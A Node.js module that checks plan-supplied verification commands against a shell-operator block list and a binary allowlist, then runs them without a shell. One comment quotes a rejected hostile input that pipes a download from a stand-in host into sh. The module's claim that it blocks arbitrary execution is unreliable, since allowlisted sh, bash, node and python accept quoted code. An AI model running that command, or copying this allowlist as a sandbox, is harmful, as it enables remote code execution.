/**
 * Execute plan verification_targets in the product workspace (D7-w1).
 */

import { execFileSync } from "node:child_process";
import path from "node:path";
import {
  defaultRoiWorkspaceRoot,
  resolveRoiPackageRoot,
  resolveProductTreeRoot,
  IMPLEMENTATION_PROOF_TRUST_MCP_VERIFIED
} from "./implementationProof.mjs";
import {
  CWD_WORKSPACE,
  CWD_PACKAGE,
  productTreeRegistry
} from "./productTrees.mjs";

export const VACUOUS_GO_TEST_MARKER = "[no tests to run]";

// Verification targets are operator-authored command strings persisted in plan
// rows. They are NOT free-form shell: the ROI lifecycle helper runs them and
// stamps the canonical mcp_verified trust marker, so an attacker who can write a
// plan must not be able to turn a verification pass into arbitrary code
// execution. We tokenize each target with a small POSIX-style lexer (honoring
// single/double quotes), split it into `&&`-joined segments, allow an optional
// leading `cd <subdir>`, require every command segment to lead with an
// allowlisted binary, and reject any other shell operator (`;`, `|`, `||`,
// redirection, subshells, backgrounding). Because each segment is executed
// argv-style via execFileSync (no shell), metacharacters *inside* quoted
// arguments (e.g. `node -e "process.exit(0)"`) are passed literally and safely.
// `go test ./...; curl evil | sh` is rejected.

// Leading binaries permitted to run as verification oracles.
const ALLOWED_ORACLE_BINARIES = new Set([
  "go",
  "task",
  "npm",
  "pnpm",
  "yarn",
  "node",
  "python",
  "python3",
  "pytest",
  "make",
  "cargo",
  "bun",
  "deno",
  // `bash <script>` runs argv-style (no shell parsing by our lexer); the script
  // path is a literal argument. Common for repo gate scripts that wrap a test
  // suite (e.g. `bash scripts/run_coverage_gate.sh`). Shell metacharacters in
  // the target string are still rejected by the tokenizer before we ever exec.
  "bash",
  "sh"
]);

function unsafeOraclesAllowed() {
  const flag = process.env.ROI_ORACLE_ALLOW_UNSAFE;
  return flag === "1" || flag === "true";
}

/**
 * Tokenize a command string into argv-style tokens plus the bare `&&` operator,
 * honoring single and double quotes. Any *unquoted* shell operator other than
 * `&&` (`;`, `|`, `||`, `&`, `<`, `>`, backtick, `$(`, `${`, `(`, `)`, newline)
 * is rejected — those only have meaning to a shell, which we never invoke.
 */
function tokenizeOracleCommand(command) {
  if (command.includes("\0")) {
    throw new Error("verification_target contains a NUL byte");
  }
  const tokens = [];
  let current = "";
  let hasCurrent = false;
  let i = 0;
  const n = command.length;
  const pushCurrent = () => {
    if (hasCurrent) {
      tokens.push({ type: "word", value: current });
      current = "";
      hasCurrent = false;
    }
  };
  while (i < n) {
    const ch = command[i];
    if (ch === "'" || ch === '"') {
      const quote = ch;
      i += 1;
      hasCurrent = true;
      while (i < n && command[i] !== quote) {
        current += command[i];
        i += 1;
      }
      if (i >= n) {
        throw new Error(`verification_target has an unterminated ${quote} quote: ${JSON.stringify(command)}`);
      }
      i += 1; // closing quote
      continue;
    }
    if (ch === " " || ch === "\t") {
      pushCurrent();
      i += 1;
      continue;
    }
    if (ch === "&") {
      if (command[i + 1] === "&") {
        pushCurrent();
        tokens.push({ type: "and" });
        i += 2;
        continue;
      }
      throw new Error(`verification_target uses background operator '&': ${JSON.stringify(command)}`);
    }
    if (ch === "\n" || ch === "\r") {
      throw new Error(`verification_target spans multiple lines: ${JSON.stringify(command)}`);
    }
    if (ch === ";" || ch === "|" || ch === "<" || ch === ">" || ch === "`" || ch === "(" || ch === ")") {
      throw new Error(
        `verification_target uses a forbidden shell operator '${ch}': ${JSON.stringify(command)}`
      );
    }
    if (ch === "$" && (command[i + 1] === "(" || command[i + 1] === "{")) {
      throw new Error(`verification_target uses shell expansion '$${command[i + 1]}': ${JSON.stringify(command)}`);
    }
    current += ch;
    hasCurrent = true;
    i += 1;
  }
  pushCurrent();
  return tokens;
}

/**
 * Parse a target into validated `&&`-joined segments. Each segment is either
 * `{ kind: "cd", dir }` (only legal as the first segment, relative subdir only)
 * or `{ kind: "exec", argv }` where argv[0] is an allowlisted binary. Throws on
 * any violation.
 */
export function parseOracleCommand(command) {
  const tokens = tokenizeOracleCommand(command);
  const rawSegments = [];
  let segment = [];
  for (const token of tokens) {
    if (token.type === "and") {
      rawSegments.push(segment);
      segment = [];
    } else {
      segment.push(token.value);
    }
  }
  rawSegments.push(segment);

  const segments = [];
  for (const [index, argv] of rawSegments.entries()) {
    if (argv.length === 0) {
      throw new Error(`verification_target has an empty command segment: ${JSON.stringify(command)}`);
    }
    const head = argv[0];
    if (head === "cd") {
      if (index !== 0) {
        throw new Error(`verification_target may only 'cd' as its first segment: ${JSON.stringify(command)}`);
      }
      const target = argv[1] ?? "";
      if (!target || path.isAbsolute(target) || target.split("/").includes("..")) {
        throw new Error(`verification_target 'cd' must target a relative subdirectory: ${JSON.stringify(command)}`);
      }
      segments.push({ kind: "cd", dir: target });
      continue;
    }
    if (!ALLOWED_ORACLE_BINARIES.has(head)) {
      throw new Error(
        `verification_target command '${head}' is not an allowlisted oracle binary ` +
          `(allowed: ${[...ALLOWED_ORACLE_BINARIES].sort().join(", ")})`
      );
    }
    segments.push({ kind: "exec", argv });
  }
  return { segments };
}

export function roiPackageRoot(workspaceRoot = defaultRoiWorkspaceRoot()) {
  return resolveRoiPackageRoot(workspaceRoot);
}

function escapeRegExp(value) {
  return String(value).replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
}

/**
 * Choose the working directory for an oracle command. Each registered product
 * tree may claim a command by matching `cd <subdir>` or a `<subdir>/` fragment;
 * the tree's `cwd` policy then decides where it runs:
 *   - workspace: workspace root (legacy `bmo` behavior; its `cd bmo` self-locates)
 *   - package:   the ROI package root (legacy `roi` behavior)
 *   - self:      the tree's own subdir root (sibling project repos)
 * Commands that match no tree fall back to the ROI package root, preserving the
 * historical default.
 */
export function oracleCwdForCommand(cmd, workspaceRoot = defaultRoiWorkspaceRoot()) {
  const trimmed = String(cmd).trim();
  const registry = productTreeRegistry(workspaceRoot);
  for (const tree of registry.values()) {
    const subdir = tree.subdir ?? tree.key;
    const claimsCommand =
      new RegExp(`(^|\\s)cd\\s+${escapeRegExp(subdir)}(\\s|$|/|&)`).test(trimmed) ||
      trimmed.includes(`${subdir}/`);
    if (!claimsCommand) {
      continue;
    }
    if (tree.cwd === CWD_WORKSPACE) {
      return workspaceRoot;
    }
    if (tree.cwd === CWD_PACKAGE) {
      return roiPackageRoot(workspaceRoot);
    }
    return resolveProductTreeRoot(tree.key, workspaceRoot);
  }
  return roiPackageRoot(workspaceRoot);
}

export function runOracleCommand(cmd, { cwd, timeoutMs = 600_000 } = {}) {
  const command = String(cmd).trim();
  if (!command) {
    return { ok: false, cmd: command, exitCode: 1, output: "empty verification_target" };
  }

  let plan;
  if (!unsafeOraclesAllowed()) {
    try {
      plan = parseOracleCommand(command);
    } catch (err) {
      return { ok: false, cmd: command, exitCode: 126, output: `blocked: ${err.message}` };
    }
  }

  try {
    const out = unsafeOraclesAllowed()
      ? runViaShell(command, { cwd, timeoutMs })
      : runViaSegments(plan.segments, { cwd, timeoutMs });
    const tail = out.slice(-8000);
    if (command.includes("go test") && tail.includes(VACUOUS_GO_TEST_MARKER)) {
      return {
        ok: false,
        cmd: command,
        exitCode: 1,
        output: `${tail}\n(vacuous go test: ${VACUOUS_GO_TEST_MARKER})`
      };
    }
    return { ok: true, cmd: command, exitCode: 0, output: tail };
  } catch (err) {
    const stdout = err.stdout?.toString() ?? "";
    const stderr = err.stderr?.toString() ?? "";
    const output = (stdout + stderr).slice(-8000) || String(err.message ?? err);
    const exitCode = typeof err.status === "number" ? err.status : 1;
    if (command.includes("go test") && output.includes(VACUOUS_GO_TEST_MARKER)) {
      return {
        ok: false,
        cmd: command,
        exitCode,
        output: `${output}\n(vacuous go test: ${VACUOUS_GO_TEST_MARKER})`
      };
    }
    return { ok: false, cmd: command, exitCode, output };
  }
}

// Escape hatch: only reached when ROI_ORACLE_ALLOW_UNSAFE is set. Kept behind
// the env gate so the default path never spawns a shell on persisted input.
function runViaShell(command, { cwd, timeoutMs }) {
  // eslint-disable-next-line no-restricted-syntax
  return execFileSync("/bin/sh", ["-c", command], {
    cwd,
    encoding: "utf8",
    stdio: ["ignore", "pipe", "pipe"],
    timeout: timeoutMs
  });
}

// Run validated `&&`-chained segments without a shell. A leading `cd` only
// shifts the cwd for subsequent exec segments; each exec runs argv directly via
// execFileSync (no shell interpretation, so metacharacters can't be injected).
function runViaSegments(segments, { cwd, timeoutMs }) {
  let runCwd = cwd;
  let combined = "";
  for (const seg of segments) {
    if (seg.kind === "cd") {
      runCwd = path.resolve(runCwd, seg.dir);
      continue;
    }
    const [bin, ...rest] = seg.argv;
    const out = execFileSync(bin, rest, {
      cwd: runCwd,
      encoding: "utf8",
      stdio: ["ignore", "pipe", "pipe"],
      timeout: timeoutMs
    });
    combined += out;
  }
  return combined;
}

export function runPlanVerificationTargets(plan, options = {}) {
  const workspaceRoot = options.workspaceRoot ?? defaultRoiWorkspaceRoot();
  const targets = Array.isArray(plan?.verification_targets) ? plan.verification_targets : [];
  const oracles_run = [];
  for (const target of targets) {
    const cmd = String(target).trim();
    if (!cmd) {
      continue;
    }
    const cwd = oracleCwdForCommand(cmd, workspaceRoot);
    const result = runOracleCommand(cmd, { cwd, timeoutMs: options.timeoutMs });
    oracles_run.push({
      cmd: result.cmd,
      ok: result.ok,
      exit_code: result.exitCode,
      output: result.output
    });
  }
  const oracles_ok =
    targets.filter((t) => String(t).trim()).length === 0
      ? true
      : oracles_run.length > 0 && oracles_run.every((row) => row.ok === true);
  return { oracles_run, oracles_ok };
}

/** Mutates `content.implementation_proof` with MCP oracle results (D7-w1). */
export function applyMcpOracleVerification(content, plan, options = {}) {
  const { oracles_run, oracles_ok } = runPlanVerificationTargets(plan, options);
  const prior =
    content.implementation_proof && typeof content.implementation_proof === "object"
      ? content.implementation_proof
      : {};
  content.implementation_proof = {
    ...prior,
    oracles_run,
    oracles_ok,
    verified_by: IMPLEMENTATION_PROOF_TRUST_MCP_VERIFIED
  };
  return { oracles_run, oracles_ok };
}

/** Mutates `content.verify_gate` with MCP oracle results for verify.evaluate (D2-D). */
export function applyVerifyGateOracleVerification(content, plans, options = {}) {
  const planList = Array.isArray(plans) ? plans : [];
  const by_plan = {};
  const oracles_run = [];
  let oracles_ok = true;
  for (const plan of planList) {
    const result = runPlanVerificationTargets(plan, options);
    by_plan[plan.id] = {
      plan_revision: plan.revision,
      oracles_run: result.oracles_run,
      oracles_ok: result.oracles_ok
    };
    for (const row of result.oracles_run) {
      oracles_run.push({ ...row, plan_id: plan.id });
    }
    if (!result.oracles_ok) {
      oracles_ok = false;
    }
  }
  if (planList.length === 0) {
    oracles_ok = true;
  }
  content.verify_gate = {
    by_plan,
    oracles_run,
    oracles_ok,
    verified_by: IMPLEMENTATION_PROOF_TRUST_MCP_VERIFIED
  };
  return { oracles_run, oracles_ok, by_plan };
}
